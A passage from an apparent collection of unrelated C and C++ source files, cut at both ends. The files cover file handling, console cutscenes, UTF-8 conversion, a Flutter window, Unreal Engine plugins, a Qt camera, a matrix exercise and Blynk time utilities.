*/\n\tbool CFileBase::Create( const char8_t * _pcFile ) {\n\t\tbool bErrored;\n\t\tstd::u16string swTmp = CUtilities::Utf8ToUtf16( _pcFile, &bErrored );\n\t\tif ( bErrored ) { return false; }\n\t\treturn Create( swTmp.c_str() );\n\t}\n\n\t/**\n\t * Creates a file.  The path is given in UTF-16.\n\t *\n\t * \\param _pcPath Path to the file to create.\n\t * \\return Returns true if the file was created, false otherwise.\n\t */\n\tbool CFileBase::Create( const char16_t * _pcFile ) {\n\t\tbool bErrored;\n\t\tstd::u8string sTmp = CUtilities::Utf16ToUtf8( _pcFile, &bErrored );\n\t\tif ( bErrored ) { return false; }\n\t\treturn Create( sTmp.c_str() );\n\t}\n\n\t/**\n\t * Closes the opened file.\n\t */\n\tvoid CFileBase::Close() {}\n\n\t/**\n\t * If true, the file is an archive containing more files.\n\t *\n\t * \\return Returns true if the file is an archive, false otherwise.\n\t */\n\tbool CFileBase::IsArchive() const { return false; }\n\n\t/**\n\t * Loads the opened file to memory, storing the result in _vResult.\n\t *\n\t * \\param _vResult The location where to store the file in memory.\n\t * \\return Returns true if the file was successfully loaded into memory.\n\t */\n\tbool CFileBase::LoadToMemory( std::vector<uint8_t> &/*_vResult*/ ) const { return false; }\n\n\t/**\n\t * Gathers the file names in the archive into an array.\n\t *\n\t * \\param _vResult The location where to store the file names.\n\t * \\return Returns true if the file names were successfully added to the given array.  A return of false will typically indicate that the file is not opened or that it is not a valid .ZIP file.\n\t */\n\tbool CFileBase::GatherArchiveFiles( std::vector<std::u16string> &/*_vResult*/ ) const { return false; }\n\n\t/**\n\t * Gathers the file names in the archive into an array.\n\t *\n\t * \\param _s16File The name of the file to extract.\n\t * \\param _vResult The location where to store the file in memory.\n\t * \\return Returns true if the file was extracted successfully.\n\t */\n\tbool CFileBase::ExtractToMemory( const std::u16string &/*_s16File*/, std::vector<uint8_t> &/*_vResult*/ ) const { return false; }\n\n\t/**\n\t * Finds files/folders in a given directory.\n\t * \n\t * \\param _pcFolderPath The path to the directory to search.\n\t * \\param _pcSearchString A wildcard search string to find only certain files/folders.\n\t * \\param _bIncludeFolders If true, folders are included in the return.\n\t * \\param _vResult The return array.  Found files and folders are appended to the array.\n\t * \\return Returns _vResult.\n\t **/\n\tstd::vector<std::u16string> & CFileBase::FindFiles( const char16_t * _pcFolderPath, const char16_t * _pcSearchString, bool _bIncludeFolders, std::vector<std::u16string> &_vResult ) {\n#ifdef PW_WINDOWS\n\t\tstd::u16string sPath = CUtilities::Replace<std::u16string>( _pcFolderPath, u'/', u'\\\\' );\n\t\twhile ( sPath.size() && sPath[sPath.size()-1] == u'\\\\' ) { sPath.pop_back(); }\n\t\tsPath.push_back( u'\\\\' );\n\t\tstd::u16string sSearch;\n\t\tif ( _pcSearchString ) {\n\t\t\tsSearch = CUtilities::Replace<std::u16string>( _pcSearchString, u'/', u'\\\\' );\n\t\t\twhile ( sSearch[0] == u'\\\\' ) {\n\t\t\t\tsSearch.erase( sSearch.begin() );\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tsSearch = u\"*\";\n\t\t}\n\n\n\t\tstd::u16string sSearchPath = sPath + sSearch;\n\t\t/*if ( sSearchPath.FindString( 0, L\"\\\\\\\\?\\\\\" ).ui32Start != 0 ) {\n\t\t\tif ( !sSearchPath.Insert( 0, L\"\\\\\\\\?\\\\\" ) ) { return false; }\n\t\t}*/\n\t\tWIN32_FIND_DATAW wfdData;\n\t\tHANDLE hDir = ::FindFirstFileW( reinterpret_cast<LPCWSTR>(sSearchPath.c_str()), &wfdData );\n\t\tif ( INVALID_HANDLE_VALUE == hDir ) { return _vResult; }\n\t\t\n\t\tdo {\n\t\t\tif ( wfdData.cFileName[0] == u'.' ) { continue; }\n\t\t\tbool bIsFolder = ((wfdData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0);\n\t\t\tif ( !_bIncludeFolders && bIsFolder ) { continue; }\n\t\t\ttry {\n\t\t\t\t_vResult.push_back( sPath + reinterpret_cast<const char16_t *>(wfdData.cFileName) );\n\t\t\t}\n\t\t\tcatch ( ... ) {\n\t\t\t\t::FindClose( hDir );\n\t\t\t\treturn _vResu",
    "#include <iostream>\n#include \"../include/utils.hpp\"\n#include \"../include/cutscenes.hpp\"\n\nint print_image(const char *dir) {\n\n\tFILE *file = fopen(dir, \"r\");\n\n\tif (file == NULL) {\n\t\tfprintf(stderr, \"%s%s%c\", \"Couldn't find the file\\\"\", dir, '\"');\n\t\treturn -1;\n\t}\n\n\tchar line[MAXLINE];\n\twhile (fgets(line, MAXLINE, file))\n\t\tprintf(\"%s\", line);\n\n\tfclose(file);\n\treturn 0;\n}\n\nint print_dialogue(const char *dialogue) {\n\n\tif (dialogue == NULL) {\n\t\tfprintf(stderr, \"%s\", \"Couldn't print the dialogue. NULL pointer given.\");\n\t\treturn -1;\n\t}\n\n\tint size = 0;\n\twhile (dialogue[size++])\n\t\tif (size > MAXLINE) {\n\t\t\tfprintf(stderr, \"%s %d %s\", \"Couldn't print the dialogue. It must be lesser than\", MAXLINE, \"characters.\");\n\t\t\treturn -1;\n\t\t}\n\n\tint dialog_box_width = 184;\n\tint box_padding = (MAXLINE - dialog_box_width) / 2;\n\tint dialog_padding = (MAXLINE - size) / 2;\n\n\n\tprintf(\"%*c%s\\n\", box_padding, ' ', \"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\");\n\tprintf(\"%*c%s\\n\", box_padding, ' ', \"\u2503                                                                                                                                                                                      \u2503\");\n\tprintf(\"%*c%s\", box_padding, ' ',   \"\u2503\");\n\n\tint i = 0;\n\n\tfor (; i < dialog_padding - box_padding; i++)\n\t\tprintf(\" \");\n\n\tprintf(\"%s\", dialogue);\n\ti += size;\n\n\tfor (; i < dialog_box_width - 1; i++)\n\t\tprintf(\" \");\n\n\tprintf(\"%s\\n\", \"\u2503\");\n\n\tprintf(\"        %s\\n\", \"\u2503                                                                                                                                                                                      \u2503\");\n\tprintf(\"        %s\\n\",   \"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\");\n\n\treturn 0;\n}\n\nint print_cutscene(scene *cutscene, int n) {\n\n\tfor(int i = 0; i < n; i++) {\n\t\tclear();\n\t\tif (print_image(cutscene[i].image) != -1 && print_dialogue(cutscene[i].dialogue) != -1)\n\t\t\tenter\n\t\telse\n\t\t\treturn -1;\n\t}\n\n\treturn 0;\n}\n",
    "#include <iostream>\n#include <string>\n#include <sstream>\n#include <iomanip>\n#include <vector>\n#include <windows.h>\n\n// Function to convert a Unicode code point to a UTF-8 string\nstd::string unicodeToUTF8(const std::string& unicode) {\n    // Convert the Unicode code point to an integer\n    unsigned int codePoint;\n    std::stringstream ss;\n    ss << std::hex << unicode.substr(2); // Skip the \"U+\"\n    ss >> codePoint;\n\n    // Convert the code point to a UTF-8 string\n    std::string utf8;\n    if (codePoint <= 0x7F) {\n        utf8 += static_cast<char>(codePoint);\n    } else if (codePoint <= 0x7FF) {\n        utf8 += static_cast<char>((codePoint >> 6) | 0xC0);\n        utf8 += static_cast<char>((codePoint & 0x3F) | 0x80);\n    } else if (codePoint <= 0xFFFF) {\n        utf8 += static_cast<char>((codePoint >> 12) | 0xE0);\n        utf8 += static_cast<char>(((codePoint >> 6) & 0x3F) | 0x80);\n        utf8 += static_cast<char>((codePoint & 0x3F) | 0x80);\n    } else if (codePoint <= 0x10FFFF) {\n        utf8 += static_cast<char>((codePoint >> 18) | 0xF0);\n        utf8 += static_cast<char>(((codePoint >> 12) & 0x3F) | 0x80);\n        utf8 += static_cast<char>(((codePoint >> 6) & 0x3F) | 0x80);\n        utf8 += static_cast<char>((codePoint & 0x3F) | 0x80);\n    }\n\n    // Convert the UTF-8 string to hexadecimal escape sequences\n    std::stringstream hexStream;\n    for (unsigned char c : utf8) {\n        hexStream << \"\\\\x\" << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(c);\n    }\n\n    return hexStream.str();\n}\n\n// Function to process an array of Unicode code points and convert them to UTF-8\nstd::vector<std::string> processUnicodeArray(const std::vector<std::string>& unicodeArray) {\n    std::vector<std::string> utf8HexArray;\n\n    for (const std::string& unicode : unicodeArray) {\n        utf8HexArray.push_back(unicodeToUTF8(unicode));\n    }\n\n    return utf8HexArray;\n}\n\nint main() {\n    // Set the console output code page to UTF-8\n    SetConsoleOutputCP(CP_UTF8);\n\n    // Example array of Unicode code points\n    std::vector<std::string> unicodeArray = {\"U+1F600\", \"U+1F601\", \"U+1F602\"}; // Adding multiple Unicodes\n\n    // Process the array of Unicode code points\n    std::vector<std::string> utf8HexArray = processUnicodeArray(unicodeArray);\n\n    // Display the UTF-8 hexadecimal escape sequences for each Unicode value\n    for (size_t i = 0; i < unicodeArray.size(); ++i) {\n        std::cout << \"Unicode: \" << unicodeArray[i] << \" -> UTF-8 Hexadecimal Escape Sequence: \" << utf8HexArray[i] << std::endl;\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"toktik\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//This is the main test file for this project.\n//Made by David Tamaratare Oghenebrume\n//@lil-brumski on GitHub.\n\n#include <student.hpp>\n#include <memory>\n#include <random>\n\nint main(){\n  \n  //This object reads from a file.\n  std::ifstream NAMES(\"../tests/test1/candidate-list.txt\");\n  \n  //For storing the names of the values gotten from the NAME object.\n  std::string collector, individual_names;\n  \n  //For generating random numbers.\n  std::random_device rd;\n  std::mt19937 gen(rd());\n  std::uniform_int_distribution<int> r_olevel_credits(2, 9), r_age(14, 23), r_jamb_score(120, 360), r_post_utme(5, 46);\n  \n  //These values store the generated random numbers.\n  int v_olevel_credits{}, v_age{}, v_jamb_score{}, v_post_utme{};\n  \n  //Checks if the file isn't open.\n  if(!NAMES.is_open()){\n    std::cerr << \"Can\\'t open file, try again.\\n\";\n  }\n  //If the file is open the while loop will run.\n  else{//else-begins.      \n      while(std::getline(NAMES, collector)){//While Loop.    \n        //This is a smart pointer for those that may not know.        \n        auto studentInfo = std::make_unique<Database>();\n        \n        //Sets the 'individual_names' variable to each line {name} in the file that's being read from.\n        individual_names = collector;\n      \n        v_olevel_credits = r_olevel_credits(gen);\n        \n        v_age = r_age(gen);\n        \n        v_jamb_score = r_jamb_score(gen);\n        \n        v_post_utme = r_post_utme(gen);\n    \n        studentInfo->checkStudent(individual_names, v_olevel_credits, v_age, v_jamb_score, v_post_utme);\n        \n        studentInfo->admission();\n        \n        studentInfo->admissionList();\n      \n     }//While Loop.  \n     NAMES.close();\n    \n   std::cout << \"Successive screening!\\n\";\n  }//else-ends.\n  \n  \n  \n}",
    "#include \"SwitchLanguageShortcut.h\"\n#include \"LevelEditor.h\"\n#include \"ToolMenus.h\"\n#include \"Framework/Commands/Commands.h\"\n#include \"Framework/Commands/UIAction.h\"\n#include \"Framework/Commands/UICommandList.h\"\n#include \"Internationalization/Culture.h\"\n#include \"Internationalization/Internationalization.h\"\n#include \"Framework/Application/SlateApplication.h\"\n#include \"Styling/AppStyle.h\"\n\n#define LOCTEXT_NAMESPACE \"FSwitchLanguageShortcutModule\"\n\nclass FSwitchLanguageShortcutCommands : public TCommands<FSwitchLanguageShortcutCommands>\n{\npublic:\n    FSwitchLanguageShortcutCommands()\n        : TCommands<FSwitchLanguageShortcutCommands>(\n            TEXT(\"SwitchLanguageShortcut\"),\n            NSLOCTEXT(\"Contexts\", \"SwitchLanguageShortcut\", \"SwitchLanguageShortcut Plugin\"),\n            NAME_None,\n            FAppStyle::GetAppStyleSetName())\n    {}\n\n    virtual void RegisterCommands() override\n    {\n        UI_COMMAND(PluginAction, \"Switch Language\", \"Switch between Chinese and English\", EUserInterfaceActionType::Button, FInputChord(EModifierKey::Alt, EKeys::T));\n    }\n\npublic:\n    TSharedPtr<FUICommandInfo> PluginAction;\n};\n\nvoid FSwitchLanguageShortcutModule::StartupModule()\n{\n    UE_LOG(LogTemp, Log, TEXT(\"SwitchLanguageShortcut module starting up\"));\n    FSwitchLanguageShortcutCommands::Register();\n    UE_LOG(LogTemp, Log, TEXT(\"SwitchLanguageShortcut commands registered\"));\n    \n    PluginCommands = MakeShareable(new FUICommandList);\n    PluginCommands->MapAction(\n        FSwitchLanguageShortcutCommands::Get().PluginAction,\n        FExecuteAction::CreateRaw(this, &FSwitchLanguageShortcutModule::SwitchLanguage),\n        FCanExecuteAction());\n    UE_LOG(LogTemp, Log, TEXT(\"SwitchLanguageShortcut shortcut mapped\"));\n\n    UToolMenus::RegisterStartupCallback(FSimpleMulticastDelegate::FDelegate::CreateRaw(this, &FSwitchLanguageShortcutModule::RegisterMenus));\n    \n    FGlobalTabmanager::Get()->RegisterNomadTabSpawner(\n        \"SwitchLanguageShortcut\",\n        FOnSpawnTab::CreateLambda([](const FSpawnTabArgs&) { return SNew(SDockTab); })\n    )\n    .SetDisplayName(LOCTEXT(\"SwitchLanguageShortcutTab\", \"Switch Language\"))\n    .SetMenuType(ETabSpawnerMenuType::Hidden);\n\n    // Register the commands with the global command list\n    FLevelEditorModule& LevelEditorModule = FModuleManager::LoadModuleChecked<FLevelEditorModule>(\"LevelEditor\");\n    LevelEditorModule.GetGlobalLevelEditorActions()->Append(PluginCommands.ToSharedRef());\n}\n\nvoid FSwitchLanguageShortcutModule::ShutdownModule()\n{\n    UToolMenus::UnRegisterStartupCallback(this);\n    UToolMenus::UnregisterOwner(this);\n    FSwitchLanguageShortcutCommands::Unregister();\n    FGlobalTabmanager::Get()->UnregisterNomadTabSpawner(\"SwitchLanguageShortcut\");\n}\n\nvoid FSwitchLanguageShortcutModule::RegisterMenus()\n{\n    UE_LOG(LogTemp, Log, TEXT(\"SwitchLanguageShortcut registering menus\"));\n    FToolMenuOwnerScoped OwnerScoped(this);\n    \n    UToolMenu* ToolbarMenu = UToolMenus::Get()->ExtendMenu(\"LevelEditor.LevelEditorToolBar.PlayToolBar\");\n    {\n        FToolMenuSection& Section = ToolbarMenu->FindOrAddSection(\"PluginTools\");\n        {\n            Section.AddEntry(FToolMenuEntry::InitToolBarButton(FSwitchLanguageShortcutCommands::Get().PluginAction));\n        }\n    }\n}\n\nvoid FSwitchLanguageShortcutModule::SwitchLanguage()\n{\n    UE_LOG(LogTemp, Log, TEXT(\"SwitchLanguage called\"));\n    \n    FString CurrentCulture = FInternationalization::Get().GetCurrentCulture()->GetName();\n    FString NewCulture = CurrentCulture == TEXT(\"en\") ? TEXT(\"zh-CN\") : TEXT(\"en\");\n    \n    UE_LOG(LogTemp, Log, TEXT(\"Switching language from %s to %s\"), *CurrentCulture, *NewCulture);\n    \n    FInternationalization::Get().SetCurrentCulture(NewCulture);\n    \n    // Attempt to refresh the UI (this might not work perfectly in all cases)\n    if (FSlateApplication::IsInitialized())\n    {\n        FSlateApplication::Get().InvalidateAllWidgets(true);\n    }\n    \n    UE_LOG(LogTemp, Log, TEXT(\"Language switch completed\"));\n}\n\n#undef LOCTEXT_NAMESPACE\n    \nIMPLEMENT_MODULE(FSwitchLanguageShortcutModule, SwitchLanguageShortcut)",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n#include \"AI/BTTask_RotateToFaceTarget.h\"\n#include \"BehaviorTree/BlackboardComponent.h\"\n#include \"AIController.h\"\n#include \"Kismet/KismetMathLibrary.h\"\n\nUBTTask_RotateToFaceTarget::UBTTask_RotateToFaceTarget()\n{\n\tNodeName\t\t\t= TEXT(\"Native Rotate to Face Target Actor\");\n\tAnglePrecision\t\t= 10.f;\n\tRotationInterpSpeed = 5.f;\n\n\tbNotifyTick\t\t\t= true;\n\tbNotifyTaskFinished = true;\n\tbCreateNodeInstance = false;\n\n\tINIT_TASK_NODE_NOTIFY_FLAGS();\n\n\tInTargetToFaceKey.AddObjectFilter(this, GET_MEMBER_NAME_CHECKED(ThisClass, InTargetToFaceKey), AActor::StaticClass());\n}\n\nvoid UBTTask_RotateToFaceTarget::InitializeFromAsset(UBehaviorTree& Asset)\n{\n\tSuper::InitializeFromAsset(Asset);\n\n\tif (const UBlackboardData* BBAsset = GetBlackboardAsset())\n\t{\n\t\tInTargetToFaceKey.ResolveSelectedKey(*BBAsset);\n\t}\n}\n\nuint16 UBTTask_RotateToFaceTarget::GetInstanceMemorySize() const\n{\n\treturn sizeof(FRotateToFaceTargetTaskMemory);\n}\n\nFString UBTTask_RotateToFaceTarget::GetStaticDescription() const\n{\n\tconst FString KeyDescription = InTargetToFaceKey.SelectedKeyName.ToString();\n\n\treturn FString::Printf(TEXT(\"Smoothly rotates to face %s Key,\\n until the angle precision %.1f is reached\"), *KeyDescription, AnglePrecision);\n}\n\nEBTNodeResult::Type UBTTask_RotateToFaceTarget::ExecuteTask(UBehaviorTreeComponent& OwnerComp, uint8* NodeMemory)\n{\n\tUObject* ActorObject = OwnerComp.GetBlackboardComponent()->GetValueAsObject(InTargetToFaceKey.SelectedKeyName);\n\tAActor* TargetActor\t = Cast<AActor>(ActorObject);\n\n\tAPawn* OwningPawn = OwnerComp.GetAIOwner()->GetPawn();\n\n\tFRotateToFaceTargetTaskMemory* Memory = CastInstanceNodeMemory<FRotateToFaceTargetTaskMemory>(NodeMemory);\n\tcheck(Memory);\n\n\tMemory->OwningPawn\t= OwningPawn;\n\tMemory->TargetActor = TargetActor;\n\n\tif (!Memory->IsValid()) return EBTNodeResult::Failed;\n\n\tif (HasReachedAnglePrecision(OwningPawn, TargetActor))\n\t{\n\t\tMemory->Reset();\n\t\treturn EBTNodeResult::Succeeded;\n\t}\n\n\treturn EBTNodeResult::InProgress;\n}\n\nvoid UBTTask_RotateToFaceTarget::TickTask(UBehaviorTreeComponent& OwnerComp, uint8* NodeMemory, float DeltaSeconds)\n{\n\tFRotateToFaceTargetTaskMemory* Memory = CastInstanceNodeMemory<FRotateToFaceTargetTaskMemory>(NodeMemory);\n\n\tif (!Memory->IsValid())\n\t{\n\t\tFinishLatentTask(OwnerComp, EBTNodeResult::Failed);\n\t}\n\n\tif (HasReachedAnglePrecision(Memory->OwningPawn.Get(), Memory->TargetActor.Get()))\n\t{\n\t\tMemory->Reset();\n\t\tFinishLatentTask(OwnerComp, EBTNodeResult::Succeeded);\n\t}\n\telse\n\t{\n\t\tconst FRotator LookAtRot = UKismetMathLibrary::FindLookAtRotation(Memory->OwningPawn->GetActorLocation(), Memory->TargetActor->GetActorLocation());\n\t\tconst FRotator TargetRot = FMath::RInterpTo(Memory->OwningPawn->GetActorRotation(), LookAtRot, DeltaSeconds, RotationInterpSpeed);\n\t\n    \tMemory->OwningPawn->SetActorRotation(TargetRot);\n\t}\n}\n\nbool UBTTask_RotateToFaceTarget::HasReachedAnglePrecision(APawn* QueryPawn, AActor* TargetActor) const\n{\n\tconst FVector OwnerForward = QueryPawn->GetActorForwardVector();\n    const FVector OwnerToTargetNormalized = (TargetActor->GetActorLocation() - QueryPawn->GetActorLocation()).GetSafeNormal();\n\n    const float DotResult = FVector::DotProduct(OwnerForward, OwnerToTargetNormalized);\n    const float AngleDiff = UKismetMathLibrary::DegAcos(DotResult);\n\n    return AngleDiff <= AnglePrecision;\n}",
    "\ufeff#include \"camera.h\"\n\nQMatrix4x4 Camera::getViewMatrix()\n{\n  QMatrix4x4 view;\n  view.lookAt(this->position, this->position + this->front, this->up);\n  return view;\n}\n\nvoid Camera::processKeyboard(Camera_Movement direction, GLfloat deltaTime)\n{\n  GLfloat velocity = this->movementSpeed * deltaTime;\n  if (direction == FORWARD)\n    this->position += this->front * velocity;\n  if (direction == BACKWARD)\n    this->position -= this->front * velocity;\n  if (direction == LEFT)\n    this->position -= this->right * velocity;\n  if (direction == RIGHT)\n    this->position += this->right * velocity;\n  if (direction == UP)\n    this->position += this->worldUp * velocity;\n  if (direction == DOWN)\n    this->position -= this->worldUp * velocity;\n}\n\nvoid Camera::processMouseMovement(GLfloat xoffset, GLfloat yoffset, GLboolean constraintPitch)\n{\n  xoffset *= this->mouseSensitivity;\n  yoffset *= this->mouseSensitivity;\n\n  this->yaw += xoffset;\n  this->picth += yoffset;\n\n  if (constraintPitch) {\n    if (this->picth > 89.0f)\n      this->picth = 89.0f;\n    if (this->picth < -89.0f)\n      this->picth = -89.0f;\n  }\n\n  this->updateCameraVectors();\n}\n\nvoid Camera::processMouseScroll(GLfloat yoffset)\n{\n  if (this->zoom >= 1.0f && this->zoom <= 45.0f)\n    this->zoom -= yoffset;\n  if (this->zoom > 45.0f)\n    this->zoom = 45.0f;\n  if (this->zoom < 1.0f)\n      this->zoom = 1.0f;\n}\n\nvoid Camera::updateCameraVectors()\n{\n  GLfloat yawR = qDegreesToRadians(this->yaw);\n  GLfloat picthR = qDegreesToRadians(this->picth);//\u8f6c\u6362\u4e3a\u5f27\u5ea6\u5236Radians\n\n  QVector3D front3(cos(yawR) * cos(picthR), sin(picthR), sin(yawR) * cos(picthR));\n  this->front = front3.normalized();\n  this->right = QVector3D::crossProduct(this->front, this->worldUp).normalized();\n  this->up = QVector3D::crossProduct(this->right, this->front).normalized();\n}\n\n",
    "#include<bits/stdc++.h>\nusing namespace std;\nint main()\n{\n    int n,m;\n    cout<<\"Enter the size\"<<endl;\n    cin>>n>>m;\n    int arr1[n][m];\n    int arr2[n][m];\n    int arr[n][m];\n    cout<<\"Enter the 1st Values.....\"<<endl;\n    for(int i=0;i<n;++i){\n        for(int j=0;j<m;++j){\n            cin>>arr1[i][j];\n        }\n    }\n    cout<<\"Enter the 2nd  Values.....\"<<endl;\n    for(int i=0;i<n;++i){\n        for(int j=0;j<m;++j){\n            cin>>arr2[i][j];\n        }\n    }\n    cout<<\"======= 2D 1st Array ========\"<<endl;\n    \n    for(int i=0;i<n;++i){\n        for(int j=0;j<m;++j){\n            cout<<arr1[i][j]<<\" \";\n        }\n        cout<<endl;\n    }\n    cout<<\"======= 2D 2st Array ========\"<<endl;\n    for(int i=0;i<n;++i){\n        for(int j=0;j<m;++j){\n            cout<<arr2[i][j]<<\" \";\n        }\n        cout<<endl;\n    }\n    cout<<\"======= Sum of the Two Arrays ========\"<<endl;\n    for(int i=0;i<n;++i){\n        for(int j=0;j<m;++j){\n           arr[i][j]=arr1[i][j]+arr2[i][j];\n        }\n    }\n    \n    for(int i=0;i<n;++i){\n        for(int j=0;j<m;++j){\n            cout<<arr[i][j]<<\" \";\n        }\n        cout<<endl;\n    }\n    cout<<\"====== Transfer Matrix ======\"<<endl;\n    for(int i=0;i<n;++i){\n        for(int j=0;j<m;++j){\n            cout<<arr[j][i]<<\" \";\n        }\n        cout<<endl;\n    }\n    \n    \n    return 0;\n \n    \n}\n",
    "#include <Blynk/BlynkDebug.h>\n#include <Blynk/BlynkDateTime.h>\n\n#include <math.h>\n\n#define YEAR_0                  1900\n#define YEAR_EPOCH              1970\n#define SECS_IN_DAY             (24L * 60L * 60L)\n#define IS_LEAP_YEAR(year)      (!((year) % 4) && (((year) % 100) || !((year) % 400)))\n#define YEAR_DAYS(year)         (IS_LEAP_YEAR(year) ? 366 : 365)\n\n#define TIME_MAX                2147483647L\n\nstatic const int month_tab[2][12] = {\n    { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 },\n    { 31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 }\n};\n\nstruct blynk_tm* blynk_gmtime_r(const blynk_time_t* t, struct blynk_tm *tm)\n{\n    blynk_time_t time = *t;\n    unsigned long dayclock, dayno;\n    int year = YEAR_EPOCH;\n\n    dayclock = (unsigned long) time % SECS_IN_DAY;\n    dayno = (unsigned long) time / SECS_IN_DAY;\n\n    tm->tm_sec = dayclock % 60;\n    tm->tm_min = (dayclock % 3600) / 60;\n    tm->tm_hour = dayclock / 3600;\n    tm->tm_wday = (dayno + 4) % 7;\n    while (dayno >= (unsigned long) YEAR_DAYS(year)) {\n        dayno -= YEAR_DAYS(year);\n        year++;\n    }\n    tm->tm_year = year - YEAR_0;\n    tm->tm_yday = dayno;\n    tm->tm_mon = 0;\n    while (dayno >= (unsigned long) month_tab[IS_LEAP_YEAR(year)][tm->tm_mon]) {\n        dayno -= month_tab[IS_LEAP_YEAR(year)][tm->tm_mon];\n        tm->tm_mon++;\n    }\n    tm->tm_mday = dayno + 1;\n    return tm;\n}\n\nblynk_time_t blynk_mk_gmtime(struct blynk_tm *tm)\n{\n    long day, year;\n    int tm_year;\n    int yday, month;\n    long seconds;\n    int overflow;\n\n    tm->tm_min += tm->tm_sec / 60;\n    tm->tm_sec %= 60;\n    if (tm->tm_sec < 0) {\n        tm->tm_sec += 60;\n        tm->tm_min--;\n    }\n    tm->tm_hour += tm->tm_min / 60;\n    tm->tm_min = tm->tm_min % 60;\n    if (tm->tm_min < 0) {\n        tm->tm_min += 60;\n        tm->tm_hour--;\n    }\n    day = tm->tm_hour / 24;\n    tm->tm_hour = tm->tm_hour % 24;\n    if (tm->tm_hour < 0) {\n        tm->tm_hour += 24;\n        day--;\n    }\n    tm->tm_year += tm->tm_mon / 12;\n    tm->tm_mon %= 12;\n    if (tm->tm_mon < 0) {\n        tm->tm_mon += 12;\n        tm->tm_year--;\n    }\n    day += (tm->tm_mday - 1);\n    while (day < 0) {\n        if (--tm->tm_mon < 0) {\n            tm->tm_year--;\n            tm->tm_mon = 11;\n        }\n        day += month_tab[IS_LEAP_YEAR(YEAR_0 + tm->tm_year)][tm->tm_mon];\n    }\n    while (day >= month_tab[IS_LEAP_YEAR(YEAR_0 + tm->tm_year)][tm->tm_mon]) {\n        day -= month_tab[IS_LEAP_YEAR(YEAR_0 + tm->tm_year)][tm->tm_mon];\n        if (++(tm->tm_mon) == 12) {\n            tm->tm_mon = 0;\n            tm->tm_year++;\n        }\n    }\n    tm->tm_mday = day + 1;\n    year = YEAR_EPOCH;\n    if (tm->tm_year < year - YEAR_0)\n        return (blynk_time_t) -1;\n    seconds = 0;\n    day = 0;\n    overflow = 